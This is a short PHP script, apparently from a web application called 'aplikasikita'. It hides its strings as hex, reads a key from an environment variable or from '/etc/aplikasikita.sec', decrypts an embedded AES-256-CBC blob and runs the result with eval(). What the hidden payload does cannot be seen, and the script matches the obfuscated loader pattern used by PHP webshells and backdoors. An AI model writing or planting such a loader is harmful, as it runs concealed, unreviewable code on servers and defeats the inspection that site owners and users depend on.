<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('rrZd6PjtCioA7tiR+KrdFA==');

$c=base64_decode(

'hbpsL5eEhXzRjV+lE6M3slN/g7TRO3mUdJEFYQ87zCogauCtQkuKR5Vu2bGGJE5t/DgG1vPGiuii' .
'aIZDnIQPAsHPnVQiVvKjLYvww4VYCOw862yYgc20/PgzAOC0FpCNhTSuIAfP5bB7odnEMQ9kOxsS' .
'sDTI0KXQqQ/4cOB/g/aSlGdPE8v/+7NPxq9QgGl+QrWEb/VOgy/2+lqGandX8xKpSe/O5aYreq9s' .
'H5pgeoPFGO5tz3J1FNxUU49b5FVuADIGkiLGMvgUvgsPob3WNQekR/UPNWq7JyDZUd2tNgrcPKq7' .
'/b6sUTEhMpJEjvS9a2bKJ05ungwq+4ZQESwnBdfk0jWB6GYJMcjV3o3cL4Zsq+XBKMS7ppILExL1' .
'RV0yQ0W4fgbZfY1N4L8IgGt+gr++ksGigEUrc5navl6yic13Dci29j6pTfyosbm2YwgiDLM4cvS5' .
'mueHT/jn9qGYFw3sYwENh14JVAgZYOCMJSJWP3GIPi0OUzP/8lE9YurKFXAVxNbA7r1cGCZ/aa3O' .
'yRrSGcEjiGY7tkbe6KVpGGGYfYQfJVvH3FrArPvlM+6cSb0QohrSFLCkYcVM+xMQJEfNzaK0ktji' .
'tCBlIiEhgx9G3LyMHM5ibxc/IUqo3Y70BQvomjgtUgdA90QO37OfjiAel8J2BPAwcv+kqK+jAC/o' .
'oj8n8k/wtzv+OIWk6ZHqWEiS4tMC6YAhp5M0J42TwQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

